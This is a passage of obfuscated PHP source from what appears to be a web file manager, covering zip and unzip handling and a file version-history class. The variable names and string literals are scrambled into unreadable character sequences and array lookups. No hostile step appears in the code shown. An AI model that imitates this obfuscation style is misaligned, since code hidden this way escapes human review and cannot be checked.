iconvApp($ŞÔÈÉÆù) { return self::local()->iconvApp($ŞÔÈÉÆù); } public static function zipFolder($ĞŸÕ¢Ş, $Â±½µşá = "\172\x69\160", $ù›İëù = '', $®â™¸¸Á = REPEAT_RENAME) { $°Çîï±¹ =& $_SERVER[ˆ¡¹µ‹Â]; $â¨ı Şé = IO::listPath($ĞŸÕ¢Ş); if (!$â¨ı Şé) { return !1; } $â¨ı Şé = array_merge($â¨ı Şé[$°Çîï±¹[85]], $â¨ı Şé[$°Çîï±¹[86]]); return self::zip($â¨ı Şé, $Â±½µşá, $ù›İëù, $®â™¸¸Á); } public static function zip($ÉŠÁÓ³‰, $ı®òöœç = "\172\151\160", $Ë‘ã¦Î¬ = '', $ùìíõƒ = REPEAT_RENAME) { $ÚµÉ©Ê =& $_SERVER[ˆ¡¹µ‹Â]; if (is_string($ÉŠÁÓ³‰) && $ÉŠÁÓ³‰) { $ÉŠÁÓ³‰ = array(array($ÚµÉ©Ê[87] => $ÉŠÁÓ³‰)); } $öùâÚ¿ = self::init($ÉŠÁÓ³‰[0][$ÚµÉ©Ê[87]]); $Å•ƒ…°ú = self::info($ÉŠÁÓ³‰[0][$ÚµÉ©Ê[87]]); $ˆÛÁŒ… = $ÚµÉ©Ê[12]; $Ú€ŸÖš = $ÚµÉ©Ê[12]; $ØşÂ²± = $ÚµÉ©Ê[12]; if ($Ë‘ã¦Î¬ && substr($Ë‘ã¦Î¬, -1, 1) != $ÚµÉ©Ê[8]) { $Ú€ŸÖš = get_path_father($Ë‘ã¦Î¬); $ØşÂ²± = get_path_this($Ë‘ã¦Î¬); } else { $Ú€ŸÖš = self::pathFather($Å•ƒ…°ú[$ÚµÉ©Ê[87]]); $ØşÂ²± = $Å•ƒ…°ú[$ÚµÉ©Ê[32]] . $ÚµÉ©Ê[10] . $ı®òöœç; if (count($ÉŠÁÓ³‰) > 1) { $íÁå†´ = IO::info($Ú€ŸÖš); $ØşÂ²± = $íÁå†´[$ÚµÉ©Ê[32]] . $ÚµÉ©Ê[10] . $ı®òöœç; } if ($Ë‘ã¦Î¬) { $Ú€ŸÖš = $Ë‘ã¦Î¬; } } if ($öùâÚ¿->getType() == $ÚµÉ©Ê[109]) { $Ë ñú©· = self::init($Ú€ŸÖš); $ÎÜ¾­ùÌ = $Ë ñú©·->getType() == $ÚµÉ©Ê[109] ? $Ú€ŸÖš : get_path_father($öùâÚ¿->path); $ÎÜ¾­ùÌ = rtrim($ÎÜ¾­ùÌ, $ÚµÉ©Ê[8]) . $ÚµÉ©Ê[8]; mk_dir($ÎÜ¾­ùÌ); } else { $ˆÛÁŒ… = TEMP_FILES . $ÚµÉ©Ê[1258] . time() . rand_string(8) . $ÚµÉ©Ê[8]; mk_dir($ˆÛÁŒ…); file_put_contents($ˆÛÁŒ… . $ÚµÉ©Ê[1259], $ÚµÉ©Ê[12]); $ÎÜ¾­ùÌ = $ˆÛÁŒ…; } $ÉîÅÆµÔ = IO::info($ÎÜ¾­ùÌ); if (!$ÉîÅÆµÔ || !$ÉîÅÆµÔ[$ÚµÉ©Ê[233]]) { show_json(LNG($ÚµÉ©Ê[1260]), !1); } $ÊÙ²–Ä = self::zipFileList($ÉŠÁÓ³‰, $ˆÛÁŒ…); foreach ($ÊÙ²–Ä as $˜•çÈ¶§ => $­Û¤ÀÁˆ) { $ÊÙ²–Ä[$˜•çÈ¶§] = self::iconvSystem($­Û¤ÀÁˆ); } $²´‘”„ = get_filename_auto($ÎÜ¾­ùÌ . $ØşÂ²±, $ÚµÉ©Ê[12], $ùìíõƒ); KodArchive::create(self::iconvSystem($²´‘”„), $ÊÙ²–Ä); if (!IO::exist($²´‘”„)) { if ($ˆÛÁŒ…) { del_dir($ˆÛÁŒ…); } write_log($ÚµÉ©Ê[1261] . $²´‘”„, $ÚµÉ©Ê[389]); show_json(LNG($ÚµÉ©Ê[1262]), !1); } if (!$ˆÛÁŒ…) { return $²´‘”„; } $Û×Õ °¦ = self::move($²´‘”„, $Ú€ŸÖš, $ùìíõƒ); if ($ˆÛÁŒ…) { del_dir($ˆÛÁŒ…); } if (!$²´‘”„) { write_log($ÚµÉ©Ê[1263] . $²´‘”„ . $ÚµÉ©Ê[1264] . $Ú€ŸÖš, $ÚµÉ©Ê[389]); show_json(LNG($ÚµÉ©Ê[1262]), !1); } return $Û×Õ °¦; } public static function unzip($°¶à¯Æ, $”á„›´, $›¾Ëöá¥ = "\x2d\x31", $»ş§©Ğä = "\162\x65\160\154\x61\x63\x65") { $òã¦äâ± =& $_SERVER[ˆ¡¹µ‹Â]; $¦ö¯ñ¹ã = parent::info($°¶à¯Æ); if (!$¦ö¯ñ¹ã) { show_json(LNG($òã¦äâ±[1265]), !1); } $ ŸĞº«³ = IO::infoFullSimple($”á„›´); if (!$ ŸĞº«³) { $”á„›´ = IO::mkdir($”á„›´); } if (isset($ ŸĞº«³[$òã¦äâ±[193]]) && trim($ ŸĞº«³[$òã¦äâ±[87]], $òã¦äâ±[8]) != trim($”á„›´, $òã¦äâ±[8])) { $Ÿö×šñ« = KodIO::make($ ŸĞº«³[$òã¦äâ±[192]]); $Õ›¹È¾Ù = IO::fileNameAuto($Ÿö×šñ«, $ ŸĞº«³[$òã¦äâ±[32]], REPEAT_RENAME_FOLDER, !0); $”á„›´ = IO::mkdir($Ÿö×šñ« . $Õ›¹È¾Ù); } $›¾Ëöá¥ = $›¾Ëöá¥ && $›¾Ëöá¥ != $òã¦äâ±[1266] ? @json_decode($›¾Ëöá¥, !0) : -1; $ÍŒ¥¸‚  = self::unzipPart($°¶à¯Æ, $›¾Ëöá¥); if (!$ÍŒ¥¸‚  || !IO::exist($ÍŒ¥¸‚ [$òã¦äâ±[230]])) { show_json(LNG($òã¦äâ±[108]), !1); } $„¬²ìü¯ = $ÍŒ¥¸‚ [$òã¦äâ±[1267]][count($ÍŒ¥¸‚ [$òã¦äâ±[1267]]) - 1]; if ($„¬²ìü¯[$òã¦äâ±[1268]] == -1 || substr($„¬²ìü¯[$òã¦äâ±[32]], -1, 1) == $òã¦äâ±[8]) { $†ç˜ãôÆ = $ÍŒ¥¸‚ [$òã¦äâ±[1269]] . rand_string(10) . $òã¦äâ±[8]; mk_dir($†ç˜ãôÆ); $€£ãèĞ = count($ÍŒ¥¸‚ [$òã¦äâ±[1267]]) == 1 ? IO::ext($°¶à¯Æ) : get_path_ext($ÍŒ¥¸‚ [$òã¦äâ±[230]]); $ÎÙ“ñš = KodArchive::extract(self::iconvSystem($ÍŒ¥¸‚ [$òã¦äâ±[230]]), $†ç˜ãôÆ, $„¬²ìü¯[$òã¦äâ±[1268]], $Õ›¹È¾Ù, $€£ãèĞ); self::unzipErrorCheck($ÎÙ“ñš, array($òã¦äâ±[1270], $°¶à¯Æ, $€£ãèĞ, $”á„›´, $ÍŒ¥¸‚ )); Hook::trigger($òã¦äâ±[1271], $†ç˜ãôÆ); recursion_dir($†ç˜ãôÆ, $ı±½‹ºî, $ŠÖßÜÄÆ, 0); $šÍ´®— = array_merge($ı±½‹ºî, $ŠÖßÜÄÆ); $‰’•˜¸ = array(); foreach ($šÍ´®— as $§ø—…í‰) { $½¯ĞÍ¾³ = IO::move(self::iconvApp($§ø—…í‰), $”á„›´, $»ş§©Ğä); if ($½¯ĞÍ¾³) { $‰’•˜¸[] = $½¯ĞÍ¾³; } } del_dir($†ç˜ãôÆ); } else { $½¯ĞÍ¾³ = IO::move($ÍŒ¥¸‚ [$òã¦äâ±[230]], $”á„›´, $»ş§©Ğä, get_path_this($„¬²ìü¯[$òã¦äâ±[32]])); if ($½¯ĞÍ¾³) { $‰’•˜¸[] = $½¯ĞÍ¾³; } } return $‰’•˜¸ ? $‰’•˜¸ : !1; } public static function unzipList($Œ·¸´Ñù) { $â©ÏÈÙõ =& $_SERVER[ˆ¡¹µ‹Â]; $«İÓ = isset($Œ·¸´Ñù[$â©ÏÈÙõ[1272]]) ? $Œ·¸´Ñù[$â©ÏÈÙõ[1272]] : !1; $ìªæœÔÈ = isset($Œ·¸´Ñù[$â©ÏÈÙõ[1268]]) ? @json_decode($Œ·¸´Ñù[$â©ÏÈÙõ[1268]], !0) : -1; $ş’Ş½› = self::unzipPart($Œ·¸´Ñù[$â©ÏÈÙõ[87]], $ìªæœÔÈ); if (!$ş’Ş½› || !IO::exist($ş’Ş½›[$â©ÏÈÙõ[230]])) { show_json(LNG($â©ÏÈÙõ[108]), !1); } $§”Ëõ›¨ = $ş’Ş½›[$â©ÏÈÙõ[1267]][count($ş’Ş½›[$â©ÏÈÙõ[1267]]) - 1]; $Ÿ§šì‰å = in_array(IO::ext($ş’Ş½›[$â©ÏÈÙõ[230]]), array($â©ÏÈÙõ[389], $â©ÏÈÙõ[1273], $â©ÏÈÙõ[1274], $â©ÏÈÙõ[1275], $â©ÏÈÙõ[1276], $â©ÏÈÙõ[1277])); if (!$«İÓ && ($§”Ëõ›¨[$â©ÏÈÙõ[1268]] == -1 || $Ÿ§šì‰å)) { $´õÁß‰Ù = $ş’Ş½›[$â©ÏÈÙõ[1269]] . get_path_this($ş’Ş½›[$â©ÏÈÙõ[230]]) . $â©ÏÈÙõ[1278]; if (!IO::exist($´õÁß‰Ù)) { $¤±ÇæÏÍ = $§”Ëõ›¨[$â©ÏÈÙõ[1268]] == -1 ? get_path_ext(IO::pathThis($Œ·¸´Ñù[$â©ÏÈÙõ[87]])) : get_path_ext($ş’Ş½›[$â©ÏÈÙõ[230]]); $‡˜ÑõÜÍ = KodArchive::listContent(self::iconvSystem($ş’Ş½›[$â©ÏÈÙõ[230]]), !0, $¤±ÇæÏÍ); self::unzipErrorCheck($‡˜ÑõÜÍ, array($â©ÏÈÙõ[1279], $Œ·¸´Ñù, $ş’Ş½›)); @file_put_contents($´õÁß‰Ù, json_encode($‡˜ÑõÜÍ[$â©ÏÈÙõ[1280]])); } return @json_decode(IO::getContent($´õÁß‰Ù), !0); } IO::fileOut($ş’Ş½›[$â©ÏÈÙõ[230]], $«İÓ, get_path_this($§”Ëõ›¨[$â©ÏÈÙõ[32]])); die; } private static function zipFileList($ÜšÔ‚Æ¤, $ÄÄµ¹Ü = false) { $òğÒŠÊÒ =& $_SERVER[ˆ¡¹µ‹Â]; $¼…½¯Ó¿ = array(); foreach ($ÜšÔ‚Æ¤ as $…¦İ°òÂ) { $Ÿ¢Öå¸™ = $…¦İ°òÂ[$òğÒŠÊÒ[87]]; if ($ÄÄµ¹Ü) { $Ÿ¢Öå¸™ = self::copy($…¦İ°òÂ[$òğÒŠÊÒ[87]], $ÄÄµ¹Ü, $òğÒŠÊÒ[893]); } else { $Ø¤Í²¸” = self::init($…¦İ°òÂ[$òğÒŠÊÒ[87]]); if ($Ø¤Í²¸”->getType() == $òğÒŠÊÒ[109]) { $Ÿ¢Öå¸™ = $Ø¤Í²¸”->path; } } if ($Ÿ¢Öå¸™ && self::local()->exist($Ÿ¢Öå¸™)) { $¼…½¯Ó¿[$…¦İ°òÂ[$òğÒŠÊÒ[87]]] = $Ÿ¢Öå¸™; } } if (!empty($¼…½¯Ó¿)) { return array_values($¼…½¯Ó¿); } show_json(LNG($òğÒŠÊÒ[1239]), !1); } private static function localFilePath($ü˜´Ê‘ƒ) { $éõœÔ¸ =& $_SERVER[ˆ¡¹µ‹Â]; $´ÉàÍéõ = KodIO::parse($ü˜´Ê‘ƒ); if ($´ÉàÍéõ[$éõœÔ¸[33]] == KodIO::KOD_SOURCE) { $¼Ú£Š• = Model($éõœÔ¸[899])->fileInfoGet(KodIO::sourceID($ü˜´Ê‘ƒ)); if (!$¼Ú£Š•[$éõœÔ¸[87]]) { show_json($éõœÔ¸[1281], !1); } $ü˜´Ê‘ƒ = $¼Ú£Š•[$éõœÔ¸[87]]; } $™ĞÑÖã = self::init($ü˜´Ê‘ƒ); if ($™ĞÑÖã->pathParse[$éõœÔ¸[1225]]) { $ü˜´Ê‘ƒ = $™ĞÑÖã->pathParse[$éõœÔ¸[1225]]; $™ĞÑÖã = self::init($ü˜´Ê‘ƒ); } $Ôï¤©Ÿœ = $™ĞÑÖã->getType(); if ($Ôï¤©Ÿœ == $éõœÔ¸[109] || $Ôï¤©Ÿœ == $éõœÔ¸[1282]) { if (!$™ĞÑÖã->exist($™ĞÑÖã->path)) { show_json(LNG($éõœÔ¸[108]), !1); } return $™ĞÑÖã->path; } return !1; } public static function unzipPart($´Ôùßïõ, $Ì›™Ç‰¶ = -1) { $’·Ÿ½ğÚ =& $_SERVER[ˆ¡¹µ‹Â]; $ø‘¦öÄ… = IO::pathThis($´Ôùßïõ); if (!$Ì›™Ç‰¶ || $Ì›™Ç‰¶ == -1) { $Æ‘ Ô´“ = array(array($’·Ÿ½ğÚ[32] => $ø‘¦öÄ…, $’·Ÿ½ğÚ[1268] => -1)); $Æ‘ Ô´“[0][$’·Ÿ½ğÚ[1283]] = $Æ‘ Ô´“[0][$’·Ÿ½ğÚ[32]]; } else { if (is_array($Ì›™Ç‰¶)) { $Æ‘ Ô´“ = $Ì›™Ç‰¶; $ºù¯ø = count($Æ‘ Ô´“) - 1; for ($ãô«óŠ = 0; $ãô«óŠ <= $ºù¯ø; $ãô«óŠ++) { $±Ô“³ˆ = $Æ‘ Ô´“[$ãô«óŠ]; $èşé Å‰ = get_path_this($±Ô“³ˆ[$’·Ÿ½ğÚ[32]]) . (checkExtSafe($±Ô“³ˆ[$’·Ÿ½ğÚ[32]]) ? $’·Ÿ½ğÚ[12] : $’·Ÿ½ğÚ[1284]); $Æ‘ Ô´“[$ãô«óŠ][$’·Ÿ½ğÚ[1283]] = $’·Ÿ½ğÚ[1285] . intval($±Ô“³ˆ[$’·Ÿ½ğÚ[1268]]) . $’·Ÿ½ğÚ[462] . $èşé Å‰; if ($ãô«óŠ == 0) { continue; } $Æ‘ Ô´“[$ãô«óŠ][$’·Ÿ½ğÚ[1283]] = $Æ‘ Ô´“[$ãô«óŠ - 1][$’·Ÿ½ğÚ[1283]] . $’·Ÿ½ğÚ[1286] . $Æ‘ Ô´“[$ãô«óŠ][$’·Ÿ½ğÚ[1283]]; } } } if (!is_array($Æ‘ Ô´“) || count($Æ‘ Ô´“) == 0) { return !1; } $êí×™Ò = $Æ‘ Ô´“[count($Æ‘ Ô´“) - 1]; if (!IO::exist($´Ôùßïõ)) { return !1; } $‹—º¿ = TEMP_FILES . $’·Ÿ½ğÚ[1287] . kodIO::hashPathSafe($´Ôùßïõ) . $’·Ÿ½ğÚ[8]; $ÖÏƒêÛ = $‹—º¿ . $êí×™Ò[$’·Ÿ½ğÚ[1283]]; mk_dir($‹—º¿); file_put_contents(TEMP_FILES . $’·Ÿ½ğÚ[1259], $’·Ÿ½ğÚ[12]); if (IO::exist($ÖÏƒêÛ)) { return array($’·Ÿ½ğÚ[230] => $ÖÏƒêÛ, $’·Ÿ½ğÚ[1267] => $Æ‘ Ô´“, $’·Ÿ½ğÚ[1269] => $‹—º¿); } $‡í×£”è = self::localFilePath($´Ôùßïõ); if (!$‡í×£”è) { $‡í×£”è = $‹—º¿ . $’·Ÿ½ğÚ[1288]; if (!IO::exist($‡í×£”è)) { self::copy($´Ôùßïõ, $‹—º¿, !1, get_path_this($‡í×£”è)); } } if (!$‡í×£”è || !IO::exist($‡í×£”è)) { return !1; } if ($êí×™Ò[$’·Ÿ½ğÚ[1268]] == -1) { return array($’·Ÿ½ğÚ[230] => $‡í×£”è, $’·Ÿ½ğÚ[1267] => $Æ‘ Ô´“, $’·Ÿ½ğÚ[1269] => $‹—º¿); } $Ğ«ùÈ˜ = $‡í×£”è; foreach ($Æ‘ Ô´“ as $ãô«óŠ => $±Ô“³ˆ) { if (!$±Ô“³ˆ || $±Ô“³ˆ[$’·Ÿ½ğÚ[1268]] == $’·Ÿ½ğÚ[1266]) { break; } if (substr($±Ô“³ˆ[$’·Ÿ½ğÚ[32]], -1, 1) == $’·Ÿ½ğÚ[8]) { break; } $¼İËı´Á = in_array(get_path_ext($±Ô“³ˆ[$’·Ÿ½ğÚ[1283]]), array($’·Ÿ½ğÚ[389], $’·Ÿ½ğÚ[1273], $’·Ÿ½ğÚ[1274], $’·Ÿ½ğÚ[1275], $’·Ÿ½ğÚ[1276], $’·Ÿ½ğÚ[1277])); $òÆª’¿¶ = $ãô«óŠ == count($Æ‘ Ô´“) - 1 && $¼İËı´Á; $ïÁ–ñ¬À = $‹—º¿ . $±Ô“³ˆ[$’·Ÿ½ğÚ[1283]]; $äœŞ…› = $‹—º¿ . get_path_this($±Ô“³ˆ[$’·Ÿ½ğÚ[32]]); if (IO::exist($ïÁ–ñ¬À)) { $Ğ«ùÈ˜ = $ïÁ–ñ¬À; continue; } $¶İÍşîö = $ãô«óŠ == 0 ? get_path_ext($ø‘¦öÄ…) : get_path_ext($Ğ«ùÈ˜); $†³ô¿‹œ = KodArchive::extract(self::iconvSystem($Ğ«ùÈ˜), $‹—º¿, $±Ô“³ˆ[$’·Ÿ½ğÚ[1268]], $¼Šµã¬Ä, $¶İÍşîö); self::unzipErrorCheck($†³ô¿‹œ, array($’·Ÿ½ğÚ[1289], $´Ôùßïõ, $Æ‘ Ô´“, $±Ô“³ˆ, $ïÁ–ñ¬À)); if (IO::exist($äœŞ…›)) { IO::rename($äœŞ…›, get_path_this($ïÁ–ñ¬À)); } $Ğ«ùÈ˜ = $ïÁ–ñ¬À; } $ÖÏƒêÛ = $Ğ«ùÈ˜; return array($’·Ÿ½ğÚ[230] => $Ğ«ùÈ˜, $’·Ÿ½ğÚ[1267] => $Æ‘ Ô´“, $’·Ÿ½ğÚ[1269] => $‹—º¿); } private static function unzipErrorCheck($ãè•Äì—, $£€†¯äŠ = false) { $ùˆ°ÀÉô =& $_SERVER[ˆ¡¹µ‹Â]; if ($ãè•Äì—[$ùˆ°ÀÉô[1290]]) { return !0; } write_log(array($ùˆ°ÀÉô[1291], $ãè•Äì—, $£€†¯äŠ), $ùˆ°ÀÉô[1292]); show_json($ùˆ°ÀÉô[1293] . json_encode($ãè•Äì—[$ùˆ°ÀÉô[1280]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Åò¼Êûë =& $_SERVER[ˆ¡¹µ‹Â]; $ËŠ˜æŠ“ = $GLOBALS[$Åò¼Êûë[6]][$Åò¼Êûë[92]]; if ($ËŠ˜æŠ“[$Åò¼Êûë[1294]] != 1) { return; } if ($ËŠ˜æŠ“[$Åò¼Êûë[1295]] <= 0) { return; } if (isset($_REQUEST[$Åò¼Êûë[1296]]) && $_REQUEST[$Åò¼Êûë[1296]] == $Åò¼Êûë[91]) { return; } Hook::bind($Åò¼Êûë[1297], $Åò¼Êûë[1298]); Hook::bind($Åò¼Êûë[1299], $Åò¼Êûë[1300]); Hook::bind($Åò¼Êûë[1301], $Åò¼Êûë[1302]); Hook::bind($Åò¼Êûë[1303], $Åò¼Êûë[1304]); Hook::bind($Åò¼Êûë[1305], $Åò¼Êûë[1306]); Hook::bind($Åò¼Êûë[1307], $Åò¼Êûë[1308]); } public static function eventBeforeUpload($€‚üõŸ) { if ($€‚üõŸ[3] && $€‚üõŸ[3] != REPEAT_REPLACE) { return; } $Ã¿›×¤ = self::parsePath($€‚üõŸ[0]); if (!$Ã¿›×¤) { return; } self::add($Ã¿›×¤); } public static function eventBeforeEdit($Û½ºÏÕ) { $şÚ‡àĞ« = self::parsePath($Û½ºÏÕ[0]); if (!$şÚ‡àĞ«) { return; } self::add($şÚ‡àĞ«); } public static function eventBeforeCopyFile($çŒıÚâà, $§ »ô¤ù, $åòôñØó, $ú§Áç¡„, $’Ó€æ€ô, $ÎÅ‡°Í) { $Äù–¹Ó =& $_SERVER[ˆ¡¹µ‹Â]; if (isset($åòôñØó->_data[$Äù–¹Ó[1229]]) && $åòôñØó->_data[$Äù–¹Ó[1229]]) { return; } $¢ó”¨Ãˆ = $åòôñØó->getPathOuter($ú§Áç¡„); $«÷ñò = self::parsePath($¢ó”¨Ãˆ); if (!$«÷ñò) { return; } self::add($«÷ñò); } public static function eventBeforeRename($Ÿ­–…ı) { $õ‘Ü­°ö =& $_SERVER[ˆ¡¹µ‹Â]; $±™ä‰²Î = self::parsePath($Ÿ­–…ı[0]); if (!$±™ä‰²Î) { return; } $•Òà‹Ññ = self::checkInHistory($±™ä‰²Î); if (!$•Òà‹Ññ) { return; } if ($•Òà‹Ññ[$õ‘Ü­°ö[33]] == $õ‘Ü­°ö[230]) { $‘¿ïÜŠ® = self::listData($±™ä‰²Î); if ($‘¿ïÜŠ® && $‘¿ïÜŠ®[$õ‘Ü­°ö[445]]) { self::moveHistory($±™ä‰²Î, $Ÿ­–…ı[1]); } } else { IO::rename($•Òà‹Ññ[$õ‘Ü­°ö[87]], $Ÿ­–…ı[1]); } } public static function eventBeforeMove($®– €‚) { $×ÒÜÉşÓ =& $_SERVER[ˆ¡¹µ‹Â]; $™œç±™ü = self::parsePath($®– €‚[0]); if (!$™œç±™ü) { return; } $¢Â™‚¹ = self::parsePath($®– €‚[1]); if (!$¢Â™‚¹) { return; } $ûŞª¦û’ = $®– €‚[3]; $ªÊŠ×°Ÿ = self::checkInHistory($™œç±™ü); if (!$ªÊŠ×°Ÿ) { return; } $†¢ı¥ºŞ = self::pathHistory($¢Â™‚¹); if ($ªÊŠ×°Ÿ[$×ÒÜÉşÓ[33]] == $×ÒÜÉşÓ[230]) { $öûŞÑ¨é = self::listData($™œç±™ü); $Â·“ú­ˆ = rtrim($¢Â™‚¹, $×ÒÜÉşÓ[8]) . $×ÒÜÉşÓ[8] . ($ûŞª¦û’ ? $ûŞª¦û’ : get_path_this($™œç±™ü)); $ªñÖ ± = self::listData($Â·“ú­ˆ); if ($öûŞÑ¨é && $öûŞÑ¨é[$×ÒÜÉşÓ[445]] && $ªñÖ ± && $ªñÖ ±[$×ÒÜÉşÓ[445]]) { return self::clear($™œç±™ü); } if ($öûŞÑ¨é && $öûŞÑ¨é[$×ÒÜÉşÓ[445]]) { self::moveHistory($™œç±™ü, $ûŞª¦û’, $†¢ı¥ºŞ); } } else { IO::move($ªÊŠ×°Ÿ[$×ÒÜÉşÓ[87]], $†¢ı¥ºŞ, !1, $ûŞª¦û’); self::clearEmptyFolder(IO::pathFather($ªÊŠ×°Ÿ[$×ÒÜÉşÓ[87]])); } } public static function eventAfterRemove($‰áñĞñı, $öíÈèöœ) { $Ó•¡À÷¿ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$öíÈèöœ) { return; } $“®¶¡û´ = self::parsePath($‰áñĞñı[0]); if (!$“®¶¡û´) { return; } $êºÕî = self::checkInHistory($“®¶¡û´); if (!$êºÕî) { return; } if ($êºÕî[$Ó•¡À÷¿[33]] == $Ó•¡À÷¿[230]) { $íêùÎÚ = self::listData($“®¶¡û´, !1); if ($íêùÎÚ && $íêùÎÚ[$Ó•¡À÷¿[445]]) { self::clear($“®¶¡û´, !1); } } else { IO::remove($êºÕî[$Ó•¡À÷¿[87]]); self::clearEmptyFolder(IO::pathFather($êºÕî[$Ó•¡À÷¿[87]])); } } private static function checkInHistory($œÂë€Ùå) { $È‚ˆÁï… = self::pathHistory($œÂë€Ùå); if (!IO::exist($È‚ˆÁï…)) { $È‚ˆÁï… .= $_SERVER[ˆ¡¹µ‹Â][1309]; } return IO::exist($È‚ˆÁï…) ? IO::info($È‚ˆÁï…) : !1; } private static function parsePath($¤Ï‡·„) { $©âéÜÇ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$¤Ï‡·„) { return !1; } if (isset($GLOBALS[$©âéÜÇ[1310]]) && $GLOBALS[$©âéÜÇ[1310]]) { return; } $ÖÖ‡î×– = KodIO::parse($¤Ï‡·„); $îôñÜ½¥ = $ÖÖ‡î×–[$©âéÜÇ[33]]; $€¦š«ë¤ = !$îôñÜ½¥ || $îôñÜ½¥ == KodIO::KOD_IO || $îôñÜ½¥ == KodIO::KOD_SHARE_ITEM; if (!$€¦š«ë¤ || !$ÖÖ‡î×–[$©âéÜÇ[1311]]) { return !1; } if (substr($¤Ï‡·„, 0, strlen(DATA_PATH . $©âéÜÇ[1312])) == DATA_PATH . $©âéÜÇ[1312]) { return !1; } if ($îôñÜ½¥ == KodIO::KOD_SHARE_ITEM) { $·„³§„“ = IO::init($¤Ï‡·„); if ($·„³§„“->pathParse[$©âéÜÇ[1225]]) { return self::parsePath($·„³§„“->pathParse[$©âéÜÇ[1225]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ÓÄèÓ“³ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $©âéÜÇ[1313]); foreach ($ÓÄèÓ“³ as $Ö™«öÇ’) { if (!$îôñÜ½¥ && substr($¤Ï‡·„, 0, strlen($Ö™«öÇ’)) == $Ö™«öÇ’) { return !1; } } self::log($GLOBALS[$©âéÜÇ[1220]] . $©âéÜÇ[1314] . $¤Ï‡·„); return $¤Ï‡·„; } private static function pathHistory($³ÓÑÔè) { $óÓ‹ÓÑ =& $_SERVER[ˆ¡¹µ‹Â]; $½¾ß¢Ò¯ = self::$_historyBase . ltrim(KodIO::clear($³ÓÑÔè), $óÓ‹ÓÑ[8]); $½¾ß¢Ò¯ = str_replace(array($óÓ‹ÓÑ[1315]), array($óÓ‹ÓÑ[1316]), $½¾ß¢Ò¯); return $½¾ß¢Ò¯; } public static function log($ ÅÏğä) { } public static function historyCount($ØŒªí§×) { $‡«´¸Îó =& $_SERVER[ˆ¡¹µ‹Â]; $éñÁú = array(); $²¤ñ­ÀØ = array(); foreach ($ØŒªí§× as $½ÆÁè¸Œ) { $’¬±ÕĞ = get_path_father($½ÆÁè¸Œ); if (!$²¤ñ­ÀØ[$’¬±ÕĞ]) { $²¤ñ­ÀØ[$’¬±ÕĞ] = array(); } $²¤ñ­ÀØ[$’¬±ÕĞ][] = get_path_this($½ÆÁè¸Œ); } foreach ($²¤ñ­ÀØ as $’¬±ÕĞ => $ç¬¹Š«â) { $æúÏ¼å = self::parsePath($’¬±ÕĞ); if (!$æúÏ¼å) { continue; } foreach ($ç¬¹Š«â as $–ûšÊı») { $ˆĞèÕ·İ = self::listData(rtrim($æúÏ¼å, $‡«´¸Îó[8]) . $‡«´¸Îó[8] . $–ûšÊı», !1); if ($ˆĞèÕ·İ && $ˆĞèÕ·İ[$‡«´¸Îó[445]]) { $éñÁú[rtrim($’¬±ÕĞ, $‡«´¸Îó[8]) . $‡«´¸Îó[8] . $–ûšÊı»] = count($ˆĞèÕ·İ[$‡«´¸Îó[445]]); } } } return $éñÁú; } public static function add($½’Ë¡®ˆ) { $Ü´—ğÚÉ =& $_SERVER[ˆ¡¹µ‹Â]; $ÃŞÌİŞ¡ = self::listData($½’Ë¡®ˆ); if (!$ÃŞÌİŞ¡) { return; } $¹¹Ñ²Ò = Model($Ü´—ğÚÉ[837])->get($Ü´—ğÚÉ[1317]); $âºş“¯å = intval($GLOBALS[$Ü´—ğÚÉ[6]][$Ü´—ğÚÉ[92]][$Ü´—ğÚÉ[1295]]); $‚ŠÁ´² = $¹¹Ñ²Ò == $Ü´—ğÚÉ[1318] ? min(5, $âºş“¯å) : $âºş“¯å; if ($âºş“¯å <= 0) { return; } $—Ú½˜åò = IO::info($½’Ë¡®ˆ); $˜ƒÃÃ Å = $ÃŞÌİŞ¡[$Ü´—ğÚÉ[445]]; if ($—Ú½˜åò[$Ü´—ğÚÉ[79]] == 0) { return; } if ($—Ú½˜åò[$Ü´—ğÚÉ[79]] >= 1024 * 1024 * 500) { return !1; } $ÃúÂÓÉ = IO::hashSimple($½’Ë¡®ˆ); if ($˜ƒÃÃ Å && $˜ƒÃÃ Å[0][$Ü´—ğÚÉ[672]] == $ÃúÂÓÉ) { return !0; } if (array_key_exists($Ü´—ğÚÉ[233], $—Ú½˜åò) && !$—Ú½˜åò[$Ü´—ğÚÉ[233]]) { return !1; } $˜È½Òã = short_id(time()); $Ğ¾ÊäÂğ = array($Ü´—ğÚÉ[475] => $˜È½Òã, $Ü´—ğÚÉ[672] => $ÃúÂÓÉ, $Ü´—ğÚÉ[32] => $—Ú½˜åò[$Ü´—ğÚÉ[32]] . $Ü´—ğÚÉ[10] . date($Ü´—ğÚÉ[1319]) . rand_string(1), $Ü´—ğÚÉ[79] => $—Ú½˜åò[$Ü´—ğÚÉ[79]], $Ü´—ğÚÉ[527] => USER_ID, $Ü´—ğÚÉ[231] => time(), $Ü´—ğÚÉ[1320] => $Ü´—ğÚÉ[12]); IO::mkdir($ÃŞÌİŞ¡[$Ü´—ğÚÉ[1321]]); $êÂö¼¤ = IO::copy($½’Ë¡®ˆ, $ÃŞÌİŞ¡[$Ü´—ğÚÉ[1321]], !1, $Ğ¾ÊäÂğ[$Ü´—ğÚÉ[32]]); if (!$êÂö¼¤) { self::clearEmptyFolder($ÃŞÌİŞ¡[$Ü´—ğÚÉ[1321]]); return !1; } array_unshift($˜ƒÃÃ Å, $Ğ¾ÊäÂğ); if (count($˜ƒÃÃ Å) > $‚ŠÁ´²) { $×­Æº» = array_slice($˜ƒÃÃ Å, $‚ŠÁ´²); foreach ($×­Æº» as $ø€É†Ã) { IO::remove($ÃŞÌİŞ¡[$Ü´—ğÚÉ[1321]] . $ø€É†Ã[$Ü´—ğÚÉ[32]]); } $˜ƒÃÃ Å = array_slice($˜ƒÃÃ Å, 0, $‚ŠÁ´²); } return self::saveData($ÃŞÌİŞ¡[$Ü´—ğÚÉ[1322]], $˜ƒÃÃ Å); } public static function remove($–ñÕŞÍÃ, $†¥É«Â‰) { $‡Úö—…‘ =& $_SERVER[ˆ¡¹µ‹Â]; $ó†ªû³Ü = self::listData($–ñÕŞÍÃ); $Â‡¯úëÇ = array(); if (!$ó†ªû³Ü) { return !1; } foreach ($ó†ªû³Ü[$‡Úö—…‘[445]] as $¾íüÌ­Î) { if 